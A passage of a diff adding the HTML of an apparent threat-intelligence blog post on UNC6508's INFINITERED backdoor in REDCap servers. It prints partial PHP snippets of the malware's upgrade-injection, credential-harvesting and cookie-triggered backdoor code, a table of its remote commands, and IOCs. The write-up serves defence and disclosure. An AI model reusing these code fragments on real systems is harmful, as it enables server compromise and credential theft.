+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="Campaign attack flow diagram" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig1.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Figure 1: Campaign attack flow diagram&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Initial Access: REDCap Exploitation and INFINITERED&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;UNC6508 consistently targets REDCap servers. REDCap is a web-based software platform designed specifically for building and managing online databases and surveys, in compliance with regulations for medical and scientific research. It is a commonly used platform in the North American medical research community.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG was not able to confirm how UNC6508 initially gained access to the REDCap server. By design, REDCap allows administrators to continue running legacy software side-by-side with the current version. UNC6508 was observed probing for these vulnerable legacy versions on several target organizations’ REDCap systems. This highlights not only the increasing importance of rapidly applying security patches, but also promptly removing older software versions to prevent &lt;/span&gt;&lt;a href="https://attack.mitre.org/techniques/T1689/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;downgrade attacks&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Upon establishing a foothold on the REDCap server, UNC6508 performed internal reconnaissance and credential discovery to obtain database and service account credentials. The threat actor also deployed a web shell named "&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;help.php&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;", which maintained persistence and functioned as an uploader in the REDCap application.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;INFINITERED Analysis&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Three months after the initial compromise, UNC6508 deployed a custom malware payload tracked as INFINITERED. This malware implements its functionality across three distinct modular components by trojanizing legitimate REDCap system files.&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Dropper and Upgrade Interception &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Credential Harvester&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backdoor, with command and control (C2)&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG discovered multiple organizations across the US and Canada compromised with INFINITERED. All of these organizations were promptly notified of the compromise upon detection and offered our assistance with remediation.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="INFINITERED diagram" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig2.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Figure 2: INFINITERED diagram&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Dropper and Upgrade Interception&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To maintain persistent remote access, INFINITERED injects its code into new REDCap versions by intercepting the upgrade process. This capability is embedded into the legitimate REDCap upgrade system file. INFINITERED performs this code injection following these steps.&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Read the current software version, which includes the INFINITERED code. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Extract the malicious logic using GUID delimiter &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;b49e334d-9c01-463e-9bc5-00a6920fb66e.&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Inject backdoor code into the custom hooks configuration file. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Inject credential harvester code into the authentication system file.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Inject the extracted code from step 2 into the upgrade system file.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In Elastic Beanstalk environments, INFINTERED performs additional steps to ensure persistence in cloud deployments. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;// b49e334d-9c01-463e-9bc5-00a6920fb66e
+...
+$file_upgrade = $base_path."Upgrade.php"; 
+$file_content_upgrade = $zip-&amp;gt;getFromName($file_upgrade); // new upgrade file content
+$file_content_upgrade_local = file_get_contents(__FILE__); // Contents of the current file 
+...
+if ($file_content_upgrade !== false) {
+    // Base64 GUID delimiter
+    $dummy_marker = base64_decode('YjQ5ZTMzNGQtOWMwMS00NjNlLTliYzUtMDBhNjkyMGZiNjZl');
+    $pattern = "/$dummy_marker(.*?)$dummy_marker/s";
+    if (preg_match($pattern, $file_content_upgrade_local, $matches)) {
+        $extracted_text = $matches[0];
+        $search_content = "// If running on AWS Elastic Beanstalk"; 
+        $upgrade_decode = "// ".$extracted_text."\r\n\t\t".$search_content;
+        $new_content = str_replace($search_content, $upgrade_decode, $file_content_upgrade);
+        $zip-&amp;gt;deleteName($file_upgrade);
+        $zip-&amp;gt;addFromString($file_upgrade, $new_content);
+    }
+}
+$zip-&amp;gt;close();
+...
+// b49e334d-9c01-463e-9bc5-00a6920fb66e&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Code Snippet 1: Intercept upgrades and inject INFINITERED code&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Credential Harvester&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;INFINITERED injects a credential harvester into the authentication system file to compromise user accounts. This component of the malware captures usernames and passwords submitted via POST requests during the login process. The credentials are encrypted using the environment’s default encryption routine and hidden inside a local REDCap sessions database table with the string “&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;xc32038474a” &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;prefixed to the Session ID. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;$currentUTC = gmdate('Y-m-d H:i:s');
+$str = encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);
+include dirname(__FILE__, 3) . DIRECTORY_SEPARATOR . 'redcap_connect.php';
+$expiration_timestamp = strtotime("+60 days", strtotime($currentUTC));
+$session_id = 'xc32038474a'.substr(bin2hex($currentUTC), -20);
+$session_sql = "INSERT INTO [REDACTED] ([REDACTED],[REDACTED],[REDACTED]) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))";
+@$rc_connection-&amp;gt;query($session_sql);&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Code Snippet 2: Hide credentials in a legitimate database table&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Backdoor&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;INFINITERED also has backdoor functionality it establishes in the custom hooks system file inside the update package, specifically within a function that executes on every REDCap page load. This global hook ensures the backdoor runs on every page load. INFINITERED looks for a specific HTTP Cookie parameter named "&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;REDCAP-TOKEN&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;" and a cookie value starting with a specific plaintext string. If these conditions are present, the malware strips the prefix and decrypts the remaining payload with the environment's default decryption routine.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-markup"&gt;&lt;code&gt;$cookieValue = $_COOKIE['REDCAP-TOKEN'];
+if ($cookieValue) {
+    $magic_flag = '[REDACTED]'; // Cookie prefix
+    ...
+    // Decrypt message if cookie prefix is found
+    $key = '[REDACTED]';
+    $req_data = substr($cookieValue, strlen($magic_flag));
+    $req_data = decrypt($req_data, $key);&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Code Snippet 3: Decrypting commands to INFINITERED&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;If the decrypted payload is empty, the malware acts as a beacon, returning system details such as the OS, PHP version, working directory, and database credentials including the hostname, username, password, and salt. When non-empty, the malware will parse the payload for command tags, which the threat actor can use to execute shell commands, run raw SQL queries, and transfer files.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Supported Commands&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;INFINITERED is capable of executing the following commands.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="center"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Command Tag&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;00&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Executes arbitrary system commands using shell_exec.&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;02&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Uploads a file to the server. The payload contains the destination path and file content.&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;03&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Retrieves stolen credentials stored in the legitimate database table.&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;04&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Deletes the stolen credential records from the legitimate database table.&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;05&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Executes arbitrary SQL queries against the database and returns the results.&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;ej671a16i7fd8202nu6ltfg5p6x7u&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Downloads an arbitrary file from the server. The payload following this tag specifies the full filesystem path of the target file.&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Empty Payload&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Beacons system information, database credentials, and configuration details.&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="vertical-align: baseline; color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;Table 1: Supported commands for INFINITERED&lt;/span&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Domain Content Compliance Rule Abuse&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;More than a year after the initial compromise, UNC6508 used overlapping credentials, harvested from REDCap, to access an administrator account. This underscores the challenge and importance of securing systems holistically. Defenders should enable &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/security/deploy-2-step-verification" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;2-Step Verification (2SV)&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; and ensure unique credentials are used across different security domains to mitigate credential replay attacks.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;UNC6508 then leveraged &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/gmail/advanced/set-up-rules-for-advanced-email-content-filtering#compliance_rules" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;content compliance rules&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, a legitimate feature present in many cloud-based enterprise productivity suites, to exfiltrate specific email communications. Administrators can create these rules to manage email messages that contain content matching predefined sets of words, phrases, text patterns, or numerical patterns. By default, compliance rules apply to all users in an organizational unit. The use of compliance rules for data exfiltration is a novel technique not previously observed with PRC-nexus threat actors.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Specifically, UNC6508 created a compliance rule named "&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;Patroit&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;" [sic] that used regular expressions to match on keyword and email address patterns in sent or received emails. Matches were silently BCC-forwarded to a threat actor-controlled Gmail address, &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;BebitaBarefoot774[@]gmail[.]com&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;, providing a covert and continuous stream of exfiltrated data. Upon discovery, GTIG disabled the Gmail account to prevent further data exfiltration.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="Targeted intelligence collection categories" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig3.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Figure 3: Targeted intelligence collection categories&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The patterns used in the “Patroit” compliance rule suggest strategic intelligence collection targeting geo-strategic policy, military strategy, advanced technology, and medical research. The patterns also include professional email addresses and phone numbers for members of organizations in these spaces. Several of the terms applied have spelling errors, suggesting the list was manually maintained. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This ambitious scope of intelligence collection from UNC6508 may suggest a broader range of targets beyond the identified victims in the medical research community. GTIG assesses these collection priorities are aligned with the strategic interests of the People's Republic of China. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;While most of the terms relate to defense and technology, the terms including medical research facilities, and the specific pathogen “Chikungunya,” stand out from the others. Chikungunya is a viral disease transmitted to humans from mosquitos and was responsible for an &lt;/span&gt;&lt;a href="https://www.unmc.edu/healthsecurity/transmission/2025/09/30/explosive-chikungunya-virus-outbreak-in-china/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;outbreak in China's Guangdong province&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; beginning in July 2025.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Operations Security (OpSec)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG observed UNC6508 use sophisticated and meticulous OpSec techniques to conceal their activities from defenders. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="UNC6508 operations security techniques" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig4.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Figure 4: UNC6508 operations security techniques&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;UNC6508 relied heavily on Obfuscation (OBF) networks. This strategy, now frequently employed by PRC-nexus actors, involves routing traffic from offensive operations through a mix of compromised routers, residential proxies, Virtual Private Servers (VPS), and other devices.  &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This operation used exclusively US-based OBF network IP addresses to access both the "&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;BebitaBarefoot774[@]gmail[.]com&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;" account and when replaying legitimate credentials to access the compromised enterprise administrator account. Additional OpSec techniques were also used, such as obtaining the threat actor-controlled Gmail account through a mass creation service and dedicating it exclusively to email data exfiltration.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;By maintaining a high level of OpSec, UNC6508 significantly complicates the efforts of defenders to identify malicious patterns, establish accurate attribution, and map the threat actor’s infrastructure.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Attribution&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG attributes this activity to UNC6508 with high confidence. This assessment is based on infrastructure overlaps between campaigns, the consistent use of the INFINITERED backdoor on REDCap servers, and the specific targeting of medical research and defense sectors. We assess UNC6508 is an espionage motivated threat cluster, with priorities that align with historic PRC state-sponsored espionage trends and intelligence collection requirements.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Indicators of Compromise (IOCs)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To assist the wider community, we have also included a list of indicators in a &lt;a href="https://www.virustotal.com/gui/collection/f3a266bed2b73690459e30a2e52e5afd4bc36ea83197ab8bf3d5cb17095a7eef" rel="noopener" target="_blank"&gt;GTI Collection&lt;/a&gt; for registered users.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Network Indicators&lt;/span&gt;&lt;/h4&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table border="1px" cellpadding="16px" style="border-collapse: collapse; width: 100%;"&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Indicator&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Type&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Context&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;BebitaBarefoot774@gmail.com&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Email&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Email exfiltration account&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;23.169.65.49&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Source of admin login (Compromised ASUS router)&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;File Indicators&lt;/span&gt;&lt;/h4&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
